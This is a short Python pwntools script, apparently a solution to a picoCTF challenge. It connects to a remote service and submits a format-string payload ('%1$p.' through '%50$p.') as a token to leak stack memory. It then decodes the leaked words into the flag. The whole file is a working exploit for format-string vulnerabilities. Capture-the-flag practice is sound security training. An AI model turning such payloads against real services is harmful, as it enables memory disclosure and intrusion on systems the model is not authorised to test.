from pwn import *
context.log_level = 'debug'
p = remote('mercury.picoctf.net', 59616)

payload = ""
for i in range(1,51):
    payload += f"%{i}$p."

p.sendlineafter(b"portfolio", b"1")
p.sendlineafter(b"token?", payload.encode())
p.recvuntil(b"token:\n")
result = p.recvline()[:-1].decode().split('.')[:-1]
log.info(result)

ans = ""
for i in range(len(result)):
    try:
        result[i] = p32(int(result[i], 16)).decode()
        ans += result[i]
    except:
        continue


log.info(result) 
log.success(ans)